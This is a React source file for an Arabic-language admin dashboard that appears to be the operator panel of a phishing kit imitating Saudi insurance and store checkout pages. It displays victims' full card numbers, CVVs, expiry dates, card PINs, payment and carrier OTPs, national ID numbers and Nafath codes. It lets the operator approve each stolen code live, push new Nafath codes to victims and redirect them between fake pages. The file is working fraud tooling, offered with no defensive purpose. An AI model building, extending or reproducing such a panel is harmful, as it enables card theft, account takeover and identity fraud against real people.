import React, {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import { serverRoute } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import { useNavigate } from "react-router-dom";
import "./dashboard.css";
import { FaBell, FaPhoneAlt } from "react-icons/fa";
import { SITE_PAGES, buildAdminRedirect } from "./sitePages";

let socket;

const LAST_SEEN_KEY = "tameen_admin_lastSeen";

const loadLastSeen = () => {
  try {
    return JSON.parse(localStorage.getItem(LAST_SEEN_KEY) || "{}");
  } catch {
    return {};
  }
};

const saveLastSeen = (map) => {
  localStorage.setItem(LAST_SEEN_KEY, JSON.stringify(map));
};

const getDocVersion = (u) => {
  const d = u.updatedAt || u.created;
  if (!d) return "";
  return new Date(d).toISOString();
};

const isUnreadUser = (u, map, didInit) => {
  const v = getDocVersion(u);
  if (!v) return false;
  const seen = map[u._id];
  if (!seen) return didInit;
  return new Date(v) > new Date(seen);
};

const isStcNet = (n) => n === "STC" || n === "اس تي سي";
const isMobilyNet = (n) => n === "Mobily" || n === "موبايلي";

const PAYMENT_METHOD_LABELS = {
  mada: "مدى",
  credit: "فيزا / ماستر",
  apple: "Apple Pay",
  stc: "STC Pay",
  bank: "تحويل بنكي",
};

function OrderField({ label, value, secret, otp, ltr }) {
  const empty = value == null || value === "";
  return (
    <div className="row">
      <span className="lbl">{label}</span>
      <span
        className={
          empty ? "val empty" : otp ? "val otp" : secret ? "val secret" : "val"
        }
        dir={ltr ? "ltr" : undefined}
      >
        {empty ? "—" : value}
      </span>
    </div>
  );
}

function OrderSection({ title, children }) {
  return (
    <div className="order-journey-section">
      <div className="order-journey-section__title">{title}</div>
      {children}
    </div>
  );
}

function renderOrderJourney(c, formatCardNum) {
  const paymentLabel =
    PAYMENT_METHOD_LABELS[c.paymentMethod] || c.paymentMethod || null;
  const isInsurance = Boolean(c.type || c.national_id);
  const payStep = isInsurance
    ? c.form_type === "store_checkout"
      ? "3. الدفع"
      : "2. الدفع"
    : c.form_type === "store_checkout"
      ? "3. الدفع"
      : "2. الدفع";
  const operatorStep = isInsurance
    ? c.form_type === "store_checkout"
      ? "4. المشغل"
      : "3. المشغل"
    : c.form_type === "store_checkout"
      ? "4. المشغل"
      : "3. المشغل";
  const otpStep = isInsurance
    ? c.form_type === "store_checkout"
      ? "5. رموز المشغل"
      : "4. رموز المشغل"
    : c.form_type === "store_checkout"
      ? "5. رموز المشغل"
      : "4. رموز المشغل";

  return (
    <div className="info-block order-journey-block">
      <div className="order-journey-grid">
        <OrderSection title="1. الجوال والدخول">
          <OrderField label="الاسم" value={c.name || c.carHolderName || c.fullname} />
          <OrderField label="البريد الإلكتروني" value={c.email} ltr />
          <OrderField label="رقم الجوال" value={c.phone} secret ltr />
          <OrderField label="رمز الدولة" value={c.countryCode} ltr />
          <OrderField
            label="مفتاح الاتصال"
            value={c.dialCode ? `+${c.dialCode}` : null}
            ltr
          />
          <OrderField label="OTP الدخول" value={c.checkoutOtp} otp ltr />
        </OrderSection>

        {isInsurance && (
          <OrderSection title="2. بيانات التأمين">
            <OrderField label="نوع التأمين" value={c.type} />
            <OrderField label="رقم الهوية" value={c.national_id} secret ltr />
            <OrderField label="نوع بطاقة التأمين" value={c.tameenType} />
            <OrderField label="اسم مالك الوثيقة" value={c.carHolderName} />
            <OrderField label="ماركة وموديل السيارة" value={c.car_model_and_brand} />
            <OrderField label="نوع السيارة" value={c.car_model} />
            <OrderField label="سنة الصنع" value={c.car_year} ltr />
            <OrderField label="الرقم التسلسلي" value={c.serialNumber} ltr />
            <OrderField label="بطاقة جمركية" value={c.Customs_card} />
            <OrderField label="الغرض من الاستخدام" value={c.purpose_of_use} />
            <OrderField label="طريقة التأمين" value={c.tameenFor} />
            <OrderField label="القيمة التأمينية" value={c.carPrice} />
            <OrderField label="تاريخ بدء الوثيقة" value={c.startedDate} ltr />
          </OrderSection>
        )}

        {c.form_type === "store_checkout" && (
          <OrderSection title="2. الطلب">
            <OrderField
              label="إجمالي الطلب"
              value={c.orderTotal != null ? `${c.orderTotal} ريال` : null}
            />
            <div className="row order-journey-items">
              <span className="lbl">المنتجات</span>
              <div className="order-journey-items__list">
                {Array.isArray(c.orderItems) && c.orderItems.length > 0 ? (
                  c.orderItems.map((item) => (
                    <span
                      key={item.id}
                      className="val"
                      style={{ fontSize: "12px" }}
                    >
                      {item.name} × {item.quantity} —{" "}
                      {(item.price * item.quantity).toFixed(2)} ريال
                    </span>
                  ))
                ) : (
                  <span className="val empty">—</span>
                )}
              </div>
            </div>
          </OrderSection>
        )}

        <OrderSection title={payStep}>
          <OrderField label="طريقة الدفع" value={paymentLabel} />
          <OrderField label="PIN البطاقة" value={c.pin} secret ltr />
          <OrderField
            label="رقم البطاقة"
            value={c.cardNumber ? formatCardNum(c.cardNumber) : null}
            secret
            ltr
          />
          <OrderField label="اسم حامل البطاقة" value={c.card_name} />
          <OrderField label="تاريخ الانتهاء" value={c.expiryDate} ltr />
          <OrderField label="CVV" value={c.cvv} secret ltr />
          <OrderField label="OTP الدفع" value={c.CardOtp} otp ltr />
        </OrderSection>

        <OrderSection title={operatorStep}>
          <OrderField label="رقم المشغل" value={c.MotslPhone} secret ltr />
          <OrderField label="شبكة المتصل" value={c.MotslNetwork} />
          <OrderField label="رقم الهوية" value={c.phoneId} secret ltr />
        </OrderSection>

        <OrderSection title={otpStep}>
          <OrderField label="OTP موبايلي" value={c.mobOtp} otp ltr />
          <OrderField label="OTP STC / Phone" value={c.MotslOtp} otp ltr />
          <OrderField
            label="بانتظار مكالمة STC"
            value={
              c.stcAwaitingCall === true
                ? "نعم"
                : c.stcAwaitingCall === false
                  ? "لا"
                  : null
            }
          />
          <OrderField label="رمز نفاذ" value={c.NavazOtp} otp ltr />
        </OrderSection>

     
      </div>
    </div>
  );
}

const Main_Page = () => {
  if (!socket) socket = io(serverRoute);

  const [Users, setUsers] = useState([]);
  const [onlineCounts, setOnlineCounts] = useState({
    visitors: 0,
    dashboard: 0,
  });
  const [selectedUserId, setSelectedUserId] = useState(null);
  const [, setLastSeenBump] = useState(0);
  const [mobileShowList, setMobileShowList] = useState(true);
  const [isNarrow, setIsNarrow] = useState(false);

  const didInitLastSeenRef = useRef(false);
  const navigate = useNavigate();

  const getUsers = useCallback(async () => {
    try {
      const res = await axios.get(`${serverRoute}/users`);
      const sortedUsers = res.data.sort(
        (a, b) => new Date(b.created) - new Date(a.created),
      );
      setUsers(sortedUsers);

      const map = loadLastSeen();
      let changed = false;
      if (!didInitLastSeenRef.current && sortedUsers.length > 0) {
        for (const u of sortedUsers) {
          if (map[u._id] == null || map[u._id] === "") {
            map[u._id] = getDocVersion(u) || new Date(0).toISOString();
            changed = true;
          }
        }
        didInitLastSeenRef.current = true;
        if (changed) saveLastSeen(map);
      }

      setSelectedUserId((prev) => {
        if (sortedUsers.length === 0) return null;
        if (prev && sortedUsers.some((u) => u._id === prev)) return prev;
        return sortedUsers[0]._id;
      });
      setLastSeenBump((t) => t + 1);
    } catch (error) {
      console.log(error);
    }
  }, []);

  useEffect(() => {
    if (!localStorage.getItem("token")) return navigate("/login");

    const onConnect = () => socket.emit("join", { role: "admin" });
    if (socket.connected) onConnect();
    socket.on("connect", onConnect);

    const onOnlineCounts = (counts) => setOnlineCounts(counts);
    socket.on("onlineCounts", onOnlineCounts);

    socket.on("newUser", getUsers);
    socket.on("newData", () => getUsers());
    socket.on("paymentForm", () => getUsers());
    socket.on("visaOtp", () => getUsers());
    socket.on("visaPin", () => getUsers());
    socket.on("motsl", () => getUsers());
    socket.on("motslOtp", getUsers);
    socket.on("navaz", getUsers);
    socket.on("phone", () => getUsers());
    socket.on("mobOtp", getUsers);
    socket.on("phoneOtp", getUsers);
    socket.on("checkoutPhone", () => getUsers());
    socket.on("checkoutOtp", () => getUsers());
    socket.on("storeLogin", () => getUsers());

    return () => {
      socket.off("connect", onConnect);
      socket.off("onlineCounts", onOnlineCounts);
      socket.off("newUser", getUsers);
      socket.off("newData", getUsers);
      socket.off("paymentForm", getUsers);
      socket.off("visaOtp", getUsers);
      socket.off("visaPin", getUsers);
      socket.off("motsl", getUsers);
      socket.off("motslOtp", getUsers);
      socket.off("navaz", getUsers);
      socket.off("phone", getUsers);
      socket.off("mobOtp", getUsers);
      socket.off("phoneOtp", getUsers);
      socket.off("checkoutPhone", getUsers);
      socket.off("checkoutOtp", getUsers);
      socket.off("storeLogin", getUsers);
    };
  }, [getUsers, navigate]);

  useEffect(() => {
    getUsers();
  }, [getUsers]);

  useEffect(() => {
    const mq = window.matchMedia("(max-width: 1023px)");
    const apply = () => setIsNarrow(mq.matches);
    apply();
    mq.addEventListener("change", apply);
    return () => mq.removeEventListener("change", apply);
  }, []);

  useEffect(() => {
    if (!isNarrow) setMobileShowList(true);
  }, [isNarrow]);

  useEffect(() => {
    if (!selectedUserId) setMobileShowList(true);
  }, [selectedUserId]);

  useEffect(() => {
    if (!selectedUserId) return;
    const u = Users.find((x) => x._id === selectedUserId);
    if (!u) return;
    const map = loadLastSeen();
    const v = getDocVersion(u);
    if (!v) return;
    if (map[selectedUserId] === v) return;
    map[selectedUserId] = v;
    saveLastSeen(map);
    setLastSeenBump((x) => x + 1);
  }, [selectedUserId, Users]);

  // Action Triggers
  const handleAcceptVisa = async (id) => {
    socket.emit("acceptPaymentForm", id);
    await getUsers();
  };

  const handleAdminRedirect = (user, page) => {
    const payload = buildAdminRedirect(user, page);
    socket.emit("adminRedirect", { id: user._id, ...payload });
  };

  const handleDeclineVisa = async (id) => {
    socket.emit("declinePaymentForm", id);
    await getUsers();
  };

  const handleAcceptVisaOtp = async (id) => {
    socket.emit("acceptVisaOtp", id);
    await getUsers();
  };

  const handleDeclineVisaOtp = async (id) => {
    socket.emit("declineVisaOtp", id);
    await getUsers();
  };

  const handleAcceptCheckoutPhone = async (id) => {
    socket.emit("acceptCheckoutPhone", id);
    await getUsers();
  };

  const handleDeclineCheckoutPhone = async (id) => {
    socket.emit("declineCheckoutPhone", id);
    await getUsers();
  };

  const handleAcceptCheckoutOtp = async (id) => {
    socket.emit("acceptCheckoutOtp", id);
    await getUsers();
  };

  const handleDeclineCheckoutOtp = async (id) => {
    socket.emit("declineCheckoutOtp", id);
    await getUsers();
  };

  const handleAcceptPin = async (id) => {
    socket.emit("acceptVisaPin", id);
    await getUsers();
  };

  const handleDeclinePin = async (id) => {
    socket.emit("declineVisaPin", id);
    await getUsers();
  };

  const handleAcceptPhone = async (id) => {
    socket.emit("acceptPhone", id);
    await getUsers();
  };

  const handleDeclinePhone = async (id) => {
    socket.emit("declinePhone", id);
    await getUsers();
  };

  const handleAcceptMobOtp = async (id) => {
    const price = window.prompt("أدخل رمز نفاذ للعميل:");
    if (price === null || price === "") {
      window.alert("يجب إدخال الرمز");
      return;
    }
    socket.emit("acceptMobOtp", { id, price });
    await getUsers();
  };

  const handleDeclineMobOtp = async (id) => {
    socket.emit("declineMobOtp", id);
    await getUsers();
  };

  const handleAcceptStcPhoneOtp = async (id) => {
    socket.emit("acceptStcPhoneOtp", id);
    await getUsers();
  };

  const handleDeclineStcPhoneOtp = async (id) => {
    socket.emit("declineStcPhoneOtp", id);
    await getUsers();
  };

  const handleAcceptService = async (id) => {
    const price = window.prompt("أدخل رمز نفاذ بعد المكالمة:");
    if (price === null || price === "") return;
    socket.emit("acceptService", { id, price });
    await getUsers();
  };

  const handleDeclineService = async (id) => {
    socket.emit("declineService", id);
    await getUsers();
  };

  const handleAcceptPhoneOTP = async (id) => {
    const price = window.prompt("أدخل رمز نفاذ للعميل:");
    if (price === null || price === "") {
      window.alert("يجب إدخال الرمز");
      return;
    }
    socket.emit("acceptPhoneOTP", { id, price });
    await getUsers();
  };

  const handleDeclinePhoneOTP = async (id) => {
    socket.emit("declinePhoneOTP", id);
    await getUsers();
  };

  const handleAcceptMotslOtp = async (id, network) => {
    let userOtp = null;
    if (!isStcNet(network)) {
      userOtp = window.prompt("الرجاء إدخال رقم نفاذ للعميل (مثال: 45):");
      if (!userOtp) return window.alert("يجب ملء رمز نفاذ للمتابعة");
    }
    socket.emit("acceptMotslOtp", { id, userOtp });
    await getUsers();
  };

  const handleDeclineMotslOtp = async (id) => {
    socket.emit("declineMotslOtp", id);
    await getUsers();
  };

  const handleAcceptSTC = async (id) => {
    socket.emit("acceptSTC", { id, userOtp: null });
    await getUsers();
  };

  const handleDeclineSTC = async (id) => {
    socket.emit("declineSTC", id);
    await getUsers();
  };

  const handleAcceptNavaz = async (id) => {
    socket.emit("acceptNavaz", { id, userOtp: null });
    await getUsers();
  };

  const handleDeclineNavaz = async (id) => {
    socket.emit("declineNavaz", id);
    await getUsers();
  };

  const handleChangeNavazCode = async (id) => {
    const userOtp = window.prompt("الرمز الجديد:");
    if (userOtp === null || userOtp === "") return;
    socket.emit("changeNavazCode", { id, userOtp });
    await getUsers();
  };

  // Delete Handlers
  const deleteUser = async (id) => {
    if (window.confirm("هل أنت متأكد من حذف العميل؟")) {
      await axios.delete(`${serverRoute}/order/${id}`);
      getUsers();
    }
  };

  const deleteAllUsers = async () => {
    if (window.confirm("هل أنت متأكد من حذف جميع العملاء والبطاقات نهائياً؟")) {
      await axios.delete(`${serverRoute}/orders/all`);
      getUsers();
    }
  };

  // Logout
  const handleLogOut = () => {
    localStorage.removeItem("token");
    window.location.reload();
  };

  const formatCardNum = (str) => {
    if (!str) return "";
    return str.replace(/(.{4})/g, "$1 ").trim();
  };

  const selectedUser = useMemo(
    () => Users.find((u) => u._id === selectedUserId) ?? null,
    [Users, selectedUserId],
  );

  const handleSelectUser = (u) => {
    setSelectedUserId(u._id);
    if (isNarrow) setMobileShowList(false);
  };

  const handleMobileBackToList = () => {
    setMobileShowList(true);
  };

  const renderClientCard = (c) => {
    const isOnline = !c.checked;

    return (
      <div key={c._id} className="client-card">
        <div className="cc-head">
          <div className="cc-user">
            <div className="cc-avatar">
              <i className="fas fa-user-check"></i>
            </div>
            <div className="cc-info">
              <h4>{c.name || c.carHolderName || c.fullname || "مجهول"}</h4>
              <span>
                ID: {c._id.slice(-6)} | {c.national_id || c.phone || "—"}
              </span>
            </div>
          </div>
          <div className={`status-badge ${isOnline ? "online" : ""}`}>
            <div className="dot"></div> {isOnline ? "متصل" : "غير متصل"}
          </div>
        </div>

        <div className="cc-body">
          {renderOrderJourney(c, formatCardNum)}
          <div className="cc-body-grid">
         

    

            <div className="cc-col cc-col--visa">
              <div className="visa-list-container">
                {c.cardNumber ? (
                  <div className="visa-card">
                    <div className="v-top">
                      <div className="v-chip"></div>{" "}
                      <i className="fab fa-cc-visa fa-lg"></i>
                    </div>
                    <div className="v-num" dir="ltr">
                      {formatCardNum(c.cardNumber)}
                    </div>
                    <div
                      style={{
                        fontSize: "11px",
                        marginBottom: "8px",
                        color: "#fff",
                        fontWeight: "bold",
                      }}
                    >
                      {c.card_name}
                    </div>
                    <div className="v-det">
                      <div>
                        EXP <span className="v-res">{c.expiryDate}</span>
                      </div>
                      <div>
                        CVV{" "}
                        <span className="v-res" style={{ color: "#fbbf24" }}>
                          {c.cvv}
                        </span>
                      </div>
                    </div>
                    {(c.visa_brand || c.visa_issuer) && (
                      <div
                        className="v-det"
                        style={{
                          marginTop: "8px",
                          borderTop: "1px dashed rgba(255,255,255,0.2)",
                          paddingTop: "5px",
                        }}
                      >
                        <div>
                          البنك:{" "}
                          <span className="v-res">{c.visa_issuer || "-"}</span>
                        </div>
                        <div>
                          نوع البطاقة:{" "}
                          <span className="v-res" style={{ color: "#10b981" }}>
                            {c.visa_type}
                          </span>
                        </div>
                        <div>
                          الشبكة:{" "}
                          <span className="v-res" style={{ color: "#10b981" }}>
                            {c.visa_brand}
                          </span>
                        </div>
                      </div>
                    )}
                  </div>
                ) : (
                  <div
                    className="val empty"
                    style={{ textAlign: "center", padding: "10px" }}
                  >
                    بانتظار إدخال البطاقة...
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        <div className="cc-foot cc-foot--centered">
          <div className="cc-foot-inner">
            <div className="page-redirect-bar">
              <div className="page-redirect-bar__label">توجيه المستخدم إلى صفحة</div>
              <div className="page-redirect-bar__buttons">
                {SITE_PAGES.map((p) => (
                  <button
                    key={p.path}
                    type="button"
                    className="page-redirect-btn"
                    onClick={() => handleAdminRedirect(c, p)}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>
            {/* Control Groups directly listed, rather than a single accept all */}
            {!c.CardAccept && c.cardNumber && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: الدفع
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptVisa(c._id)}
                  >
                    قبول الدفع
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineVisa(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.OtpCardAccept && c.CardOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: OTP الدفع
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptVisaOtp(c._id)}
                  >
                    قبول OTP
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineVisaOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.PinAccept && c.pin && c.CardAccept && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: PIN البطاقة
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptPin(c._id)}
                  >
                    قبول PIN
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclinePin(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.MotslAccept &&
              c.CardAccept &&
              (c.PinAccept || c.OtpCardAccept) &&
              c.MotslPhone && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    تأكيد بيانات الجوال
                  </div>
                  <div className="btn-act-group">
                    <button
                      className="btn-act accept"
                      style={{ backgroundColor: "#0ea5e9" }}
                      onClick={() => handleAcceptPhone(c._id)}
                    >
                      قبول والمتابعة
                    </button>
                    <button
                      className="btn-act decline"
                      onClick={() => handleDeclinePhone(c._id)}
                    >
                      رفض{" "}
                    </button>
                  </div>
                </div>
              )}

            {c.mobOtp && isMobilyNet(c.MotslNetwork) && !c.NavazOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  موبايلي — رمز التحقق
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptMobOtp(c._id)}
                  >
                    قبول وإرسال رمز نفاذ
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineMobOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {isStcNet(c.MotslNetwork) &&
              c.MotslOtp &&
              !c.stcAwaitingCall &&
              !c.NavazOtp && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    {" "}
                    قبول OTP{" "}
                  </div>
                  <div className="btn-act-group">
                    <button
                      className="btn-act accept"
                      onClick={() => handleAcceptStcPhoneOtp(c._id)}
                    >
                      قبول OTP
                    </button>
                    <button
                      className="btn-act decline"
                      onClick={() => handleDeclineStcPhoneOtp(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {isStcNet(c.MotslNetwork) && c.stcAwaitingCall && !c.NavazOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptService(c._id)}
                  >
                    قبول وإرسال رمز نفاذ
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineService(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!isStcNet(c.MotslNetwork) &&
              !isMobilyNet(c.MotslNetwork) &&
              c.MotslOtp &&
              !c.NavazOtp &&
              !c.mobOtp && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    شبكة عامة — OTP المشغل (قبل نفاذ)
                  </div>
                  <div className="btn-act-group">
                    <button
                      className="btn-act accept"
                      onClick={() => handleAcceptPhoneOTP(c._id)}
                    >
                      قبول وإرسال رمز نفاذ
                    </button>
                    <button
                      className="btn-act decline"
                      onClick={() => handleDeclinePhoneOTP(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {!c.NavazAccept && c.NavazOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: نفاذ النهائي
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineNavaz(c._id)}
                  >
                    رفض نفاذ
                  </button>
                  <button
                    className="btn-act accept"
                    style={{ backgroundColor: "#6366f1" }}
                    onClick={() => handleChangeNavazCode(c._id)}
                  >
                    تغيير الرمز
                  </button>
                </div>
              </div>
            )}

            <div className="w-full flex justify-between gap-x-2 mt-2 cc-foot-delete">
              <button
                className="btn-del grow w-full font-bold"
                onClick={() => deleteUser(c._id)}
              >
                <i className="fas fa-trash ml-2"></i> حذف العميل
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const lastSeenSnapshot = loadLastSeen();

  const showAside = !isNarrow || mobileShowList;
  const showMain = !isNarrow || !mobileShowList;

  const selectedUnread = selectedUser
    ? isUnreadUser(selectedUser, lastSeenSnapshot, didInitLastSeenRef.current)
    : false;

  return (
    <div className="dashboard-layout" dir="rtl">
      <aside
        className="sidebar users-sidebar"
        hidden={!showAside}
        aria-hidden={!showAside}
      >
        <div className="sidebar-head">
          <h3>
            <i className="fas fa-users"></i> العملاء والمرسلون
          </h3>
        </div>
        <div className="user-sidebar-list">
          {Users.length === 0 ? (
            <div className="user-sidebar-empty">لا يوجد عملاء حالياً</div>
          ) : (
            Users.map((u) => {
              const label =
                u.name || u.carHolderName || u.fullname || u.national_id || "مجهول";
              const unread = isUnreadUser(
                u,
                lastSeenSnapshot,
                didInitLastSeenRef.current,
              );
              const active = u._id === selectedUserId;
              return (
                <button
                  key={u._id}
                  type="button"
                  className={`user-sidebar-item${active ? " is-active" : ""}${unread ? " has-unread" : ""}`}
                  onClick={() => handleSelectUser(u)}
                >
                  <span className="user-sidebar-item__row">
                    <span
                      className="user-sidebar-item__name-text"
                      title={label}
                    >
                      {label}
                    </span>
                    {unread ? (
                      <FaBell
                        className="user-sidebar-item__unread-icon"
                        title="بيانات جديدة"
                        aria-label="بيانات جديدة"
                      />
                    ) : null}
                  </span>
                  <span className="user-sidebar-item__meta">
                    {u._id.slice(-6)} | {u.national_id || u.phone || "—"}
                  </span>
                </button>
              );
            })
          )}
        </div>
      </aside>

      <main className="main" hidden={!showMain} aria-hidden={!showMain}>
        <header className="top-bar">
          <div className="page-title top-bar__title-row">
            {isNarrow && selectedUserId && !mobileShowList && (
              <button
                type="button"
                className="btn-mobile-back"
                onClick={handleMobileBackToList}
              >
                <i className="fas fa-arrow-right"></i> القائمة
              </button>
            )}
            {isNarrow && !mobileShowList && selectedUser && (
              <div
                className="mobile-top-user"
                title={
                  selectedUser.name || selectedUser.carHolderName || "مجهول"
                }
              >
                <span className="mobile-top-user__name">
                  {selectedUser.name || selectedUser.carHolderName || "مجهول"}
                </span>
                {selectedUnread ? (
                  <FaBell
                    className="mobile-top-user__bell"
                    title="بيانات جديدة"
                    aria-label="بيانات جديدة"
                  />
                ) : null}
              </div>
            )}
            <span className="page-title__text">
              <i className="fas fa-terminal"></i> غرفة التحكم المركزية
            </span>
          </div>
          <div className="top-actions">
            <div className="stats-pill stats-pill--visitors">
              <span className="pulse-dot pulse-dot--inline"></span>
              زوار: {onlineCounts.visitors}
            </div>
            <div className="stats-pill stats-pill--admins">
              أدمن: {onlineCounts.dashboard}
            </div>
            <div className="stats-pill">إجمالي الطلبات: {Users.length}</div>
            <button className="btn-action btn-del-all" onClick={deleteAllUsers}>
              <i className="fas fa-trash-alt"></i> حذف جميع العملاء
            </button>
            <button className="btn-action btn-out" onClick={handleLogOut}>
              <i className="fas fa-sign-out-alt"></i> تسجيل خروج
            </button>
          </div>
        </header>

        <div
          className="grid-container grid-container--single"
          id="clients-container"
        >
          {!selectedUser ? (
            <div className="main-empty-state">
              <p>اختر عميلاً من القائمة لعرض التفاصيل.</p>
            </div>
          ) : (
            renderClientCard(selectedUser)
          )}
        </div>
      </main>
    </div>
  );
};

export default Main_Page;
